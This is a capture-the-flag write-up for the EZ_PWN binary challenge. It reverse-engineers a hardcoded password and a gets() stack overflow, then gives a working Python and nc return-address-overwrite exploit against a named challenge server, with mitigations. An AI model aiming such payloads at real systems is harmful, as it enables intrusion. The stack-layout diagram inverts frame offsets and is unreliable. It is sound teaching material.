# EZ_PWN CTF Challenge - Complete Writeup

**Challenge:** EZ_PWN  
**Category:** Binary Exploitation / PWN  
**Target:** `nc 203.154.91.221 5225`  
**Flag:** `flag{16ee4ab95cf774231c94fcce1a81c586}`  

## Challenge Overview

EZ_PWN is a classic buffer overflow exploitation challenge that demonstrates the fundamentals of binary exploitation. The challenge involves bypassing password authentication and exploiting a buffer overflow vulnerability to redirect program execution to a hidden function that reveals the flag.

## Initial Analysis

### File Information
```bash
$ file EZ_PWN_local
EZ_PWN_local: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4495e66b8ae7eb6ad3ba1c9fbcabc59b7a340d09, for GNU/Linux 3.2.0, not stripped
```

Key observations:
- 64-bit ELF executable
- Dynamically linked
- **Not stripped** - This is crucial as it means function names are preserved, making analysis easier

### String Analysis
```bash
$ strings EZ_PWN_local
```

Important strings discovered:
- `securityH` and `P@ssw0rdH` - Potential passwords
- `FLAG CAPTURED!` and `flag{xxx}` - Flag-related strings
- `HELLO WORLD FUNCTION ACTIVATED!` - Hidden function
- `TRIGGER_LAND FUNCTION ACTIVATED` - Vulnerable function
- `Buffer contents: %s` - Buffer overflow hint

Function names from symbol table:
- `main`
- `check_password`
- `helloWorld`
- `onepiece`
- `triggerland`

## Reverse Engineering

### Program Flow Analysis

Using `objdump -d EZ_PWN_local`, we can analyze the program flow:

#### 1. Main Function (`0x21011335`)
```asm
21011335 <main>:
    21011335: bf 20 21 01 21    mov    $0x21012120,%edi
    2101133a: e8 ed fc ff ff    call   21011030 <puts@plt>    ; Welcome message
    2101133f: bf 48 21 01 21    mov    $0x21012148,%edi
    21011344: e8 e3 fc ff ff    call   21011030 <puts@plt>    ; ASEAN community
    21011349: e8 f6 fe ff ff    call   2101125c <check_password>
    2101134e: 85 c0             test   %eax,%eax
    21011350: 75 20             jne    21011372 <main+0x3d>   ; Jump if password correct
    ; If password wrong:
    21011352: bf 78 21 01 21    mov    $0x21012178,%edi
    21011357: e8 d4 fc ff ff    call   21011030 <puts@plt>    ; "Access denied"
    ; If password correct:
    21011372: bf a0 21 01 21    mov    $0x210121a0,%edi
    21011377: e8 b4 fc ff ff    call   21011030 <puts@plt>    ; "Password correct"
    2101137c: e8 77 fe ff ff    call   210111f8 <triggerland> ; Call vulnerable function
```

#### 2. Password Check Function (`0x2101125c`)
```asm
2101125c <check_password>:
    ; Setup two passwords on stack:
    21011264: 48 b8 73 65 63 75 72 69 74 79    movabs $0x7974697275636573,%rax  ; "security"
    2101126e: 48 89 45 d4                      mov    %rax,-0x2c(%rbp)
    21011272: c7 45 dc 31 32 33 00             movl   $0x333231,-0x24(%rbp)     ; "123"
    
    21011279: 48 b8 50 40 73 73 77 30 72 64    movabs $0x6472307773734050,%rax  ; "P@ssw0rd"
    21011283: 48 89 45 cb                      mov    %rax,-0x35(%rbp)
    
    ; Read user input
    210112a9: e8 9f fd ff ff                   call   21011060 <fgets@plt>
    
    ; Compare with "P@ssw0rd"
    210112d7: e8 86 fd ff ff                   call   21011070 <strcmp@plt>
    210112dc: 85 c0                            test   %eax,%eax
    210112de: 75 2a                            jne    2101130a <check_password+0xae>
    ; If "P@ssw0rd" matches:
    210112e0: e8 b6 fe ff ff                   call   210111c7 <helloWorld>  ; Decoy function
    210112e5: b8 00 00 00 00                   mov    $0x0,%eax              ; Return 0 (failure)
    
    ; Compare with "security123"  
    2101130a: e8 45 fd ff ff                   call   21011070 <strcmp@plt>
    2101130f: 85 c0                            test   %eax,%eax
    21011311: 0f 94 c0                         sete   %al                   ; Return 1 if match
```

**Password Logic:**
- Input == "P@ssw0rd" → calls `helloWorld()` → returns 0 (access denied)
- Input == "security123" → returns 1 (access granted)

#### 3. Vulnerable Function - triggerland (`0x210111f8`)
```asm
210111f8 <triggerland>:
    210111f8: 55                               push   %rbp
    210111f9: 48 89 e5                         mov    %rsp,%rbp
    210111fc: 48 83 ec 40                      sub    $0x40,%rsp           ; 64-byte buffer
    21011200: bf 88 20 01 21                   mov    $0x21012088,%edi
    21011205: e8 26 fe ff ff                   call   21011030 <puts@plt>  ; "TRIGGER_LAND ACTIVATED"
    2101120a: bf b1 20 01 21                   mov    $0x210120b1,%edi
    2101120f: e8 27 fe ff ff                   call   21011040 <printf@plt> ; ">> "
    21011228: 48 8d 45 c0                      lea    -0x40(%rbp),%rax     ; Buffer address
    2101122c: 48 89 c7                         mov    %rax,%rdi
    2101122f: e8 4c fe ff ff                   call   21011080 <gets@plt>  ; VULNERABILITY!
    21011234: 48 8d 45 c0                      lea    -0x40(%rbp),%rax
    21011238: 48 89 c6                         mov    %rax,%rsi
    2101123b: bf b5 20 01 21                   mov    $0x210120b5,%edi
    21011240: e8 f6 fd ff ff                   call   21011040 <printf@plt> ; Print buffer contents
```

**Vulnerability:** The `gets()` function has no bounds checking, allowing buffer overflow!

#### 4. Target Function - onepiece (`0x21011196`)
```asm
21011196 <onepiece>:
    21011196: 55                               push   %rbp
    21011197: 48 89 e5                         mov    %rsp,%rbp
    2101119a: bf 08 20 01 21                   mov    $0x21012008,%edi
    2101119f: e8 8c fe ff ff                   call   21011030 <puts@plt>  ; "FLAG CAPTURED!"
    210111a4: bf 34 20 01 21                   mov    $0x21012034,%edi
    210111a9: e8 82 fe ff ff                   call   21011030 <puts@plt>  ; "flag{xxx}"
```

**Goal:** Redirect execution to this function to get the flag!

## Vulnerability Analysis

### Buffer Layout
```
Stack Layout in triggerland():
+------------------+ <- %rbp
| Saved RBP (8)    |
+------------------+ <- %rbp - 0x8
| Return Addr (8)  |
+------------------+ <- %rbp - 0x10
| ...              |
| Buffer (64 bytes)|
| ...              |
+------------------+ <- %rbp - 0x40 (buffer start)
```

### Exploitation Strategy
1. **Step 1:** Enter "security123" to pass password check and reach `triggerland()`
2. **Step 2:** Send buffer overflow payload to overwrite return address with `onepiece()` address

**Payload Structure:**
```
[64 bytes padding] + [8 bytes RBP] + [onepiece address (0x21011196)]
Total: 72 bytes + 8 bytes = 80 bytes
```

## Exploitation

### Payload Development

The key insight is calculating the correct offset to overwrite the return address:

```python
# Target function address
ONEPIECE_ADDR = 0x21011196

# Payload construction
payload = b'A' * 72                          # Fill buffer + saved RBP
payload += struct.pack('<Q', ONEPIECE_ADDR)  # Overwrite return address
```

### Exploit Script

```python
#!/usr/bin/env python3
import socket
import struct

HOST = '203.154.91.221'
PORT = 5225
ONEPIECE_ADDR = 0x21011196

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Step 1: Send password
    data = s.recv(4096)
    print("Initial:", data.decode())
    
    s.send(b'security123\n')
    
    # Step 2: Wait for triggerland prompt
    data = s.recv(4096)
    print("After password:", repr(data))
    
    # Step 3: Send buffer overflow payload
    payload = b'A' * 72 + struct.pack('<Q', ONEPIECE_ADDR)
    s.send(payload + b'\n')
    
    # Step 4: Capture flag
    response = s.recv(4096)
    print("Response:", repr(response))
    
    if b'flag{' in response:
        flag = response.decode()
        print(f"\n🏴‍☠️ FLAG CAPTURED: {flag}")
    
    s.close()

if __name__ == "__main__":
    exploit()
```

### Manual Exploitation

For quick manual testing:
```bash
(echo "security123"; python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\x96\x11\x01\x21\x00\x00\x00\x00')") | nc 203.154.91.221 5225
```

## Flag Capture

Running the exploit:

```
=== WELCOME TO EZ PWN CHALLENGE! ===
This challenge is created by ASEAN community
Enter password to access: 
Password correct! Accessing function...

=== TRIGGER_LAND FUNCTION ACTIVATED ===
>> Buffer contents: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��!

🏴‍☠️ FLAG CAPTURED! 🏴‍☠️
flag{16ee4ab95cf774231c94fcce1a81c586}
```

## Key Learning Points

### Technical Skills Demonstrated
1. **Static Analysis:** Using `file`, `strings`, and `objdump` for binary analysis
2. **Reverse Engineering:** Understanding assembly code and program flow
3. **Memory Layout:** Knowledge of stack frame structure and calling conventions
4. **Buffer Overflows:** Exploiting unsafe functions like `gets()`
5. **Return Address Hijacking:** Redirecting program execution flow

### Security Concepts
1. **Defense in Depth:** Multiple layers of security (password + proper input validation)
2. **Secure Coding:** Avoiding dangerous functions like `gets()`
3. **Stack Protection:** Modern binaries often include stack canaries and ASLR
4. **Code Review:** Importance of identifying potential vulnerabilities during development

### Tools and Techniques Used
- **Static Analysis:** `file`, `strings`, `objdump`
- **Dynamic Analysis:** Manual testing with `nc`
- **Exploitation:** Python scripting for payload generation
- **Debugging:** Iterative testing with different offsets

## Mitigation Strategies

To prevent this type of vulnerability:

1. **Use Safe Functions:** Replace `gets()` with `fgets()` or `scanf()` with proper bounds
2. **Input Validation:** Always validate input length and content
3. **Stack Canaries:** Compile with `-fstack-protector-all`
4. **ASLR:** Enable Address Space Layout Randomization
5. **DEP/NX:** Enable Data Execution Prevention
6. **Bounds Checking:** Use languages or tools that provide automatic bounds checking

## Conclusion

EZ_PWN effectively demonstrates the fundamentals of buffer overflow exploitation in a controlled environment. The challenge requires understanding of:
- Binary analysis and reverse engineering
- Stack memory layout and calling conventions  
- Password bypass techniques
- Buffer overflow exploitation
- Return address hijacking

The successful exploitation yielded the flag: **`flag{16ee4ab95cf774231c94fcce1a81c586}`**
